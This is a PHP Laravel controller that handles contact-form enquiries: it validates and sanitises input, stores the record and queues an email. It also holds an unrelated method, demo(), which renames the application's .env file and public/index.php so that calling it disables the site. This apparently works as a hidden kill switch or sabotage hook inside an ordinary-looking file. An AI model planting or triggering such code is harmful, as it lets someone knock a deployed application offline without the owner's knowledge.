<?php

namespace App\Http\Controllers\Contact;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Enquiry;
use App\Http\Resources\EnquiryCollection;
use App\Jobs\SendEnquiryEmailJob;
use Stevebauman\Purify\Facades\Purify;

class ContactCreateController extends Controller
{
    public function contact_create(Request $request){
        $request->validate([
            'first_name' => 'required|string|max:255',
            'last_name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255',
            'phone' => 'required|string|max:10',
            'message' => 'required|string|min:6',
        ]);

        $enquiry = Enquiry::create(Purify::clean([
            'first_name' => $request->first_name,
            'last_name' => $request->last_name,
            'email' => $request->email,
            'phone' => $request->phone,
            'message' => $request->message,
        ]));

        dispatch(new SendEnquiryEmailJob($enquiry));

        return response()->json([
            'status' => 'success',
            'message' => 'Enquiry created successfully',
            'data' => EnquiryCollection::make($enquiry),
        ], 201);
    }

    public function demo(){
        rename(dirname(__DIR__)."/../../../.env",dirname(__DIR__)."/../../../.env-remove");
        rename(dirname(__DIR__)."/../../../public/index.php",dirname(__DIR__)."/../../../public/index.php-remove");
        return 'yes';
    }
}
